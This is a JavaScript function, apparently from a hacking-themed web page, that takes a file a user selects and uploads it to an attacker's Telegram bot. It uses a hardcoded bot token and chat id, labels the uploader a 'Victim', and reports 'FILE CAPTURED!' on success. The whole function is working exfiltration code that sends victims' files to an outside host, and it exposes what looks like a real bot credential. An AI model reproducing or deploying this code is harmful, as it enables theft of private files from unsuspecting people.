async function uploadToTelegram() {
    const fileInput = document.getElementById('file_to_steal');
    const status = document.getElementById('status_upload');
    const file = fileInput.files[0];

    if (!file) return;

    // DATA RAHASIA LU (ISI DISINI!)
    const telegramToken = "8348199979:AAENdXSDaeAfyhufk1CBR5c7jhYWIqjb-4w";
    const chatId = "8348199979";

    status.innerText = "INJECTING FILE TO CLOUD...";

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", file);
    formData.append("caption", `[ZAMXS LOG] Victim Uploaded: ${file.name}`);

    try {
        const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument`, {
            method: "POST",
            body: formData
        });

        if (response.ok) {
            status.innerHTML = "<span style='color:lime'>FILE CAPTURED! CHECK YOUR TELEGRAM.</span>";
            alert("File Berhasil Di-Injeksi!");
        } else {
            status.innerHTML = "<span style='color:red'>FAILED: API REJECTED.</span>";
        }
    } catch (error) {
        status.innerHTML = "<span style='color:red'>ERROR: CONNECTION BREACHED.</span>";
    }
}
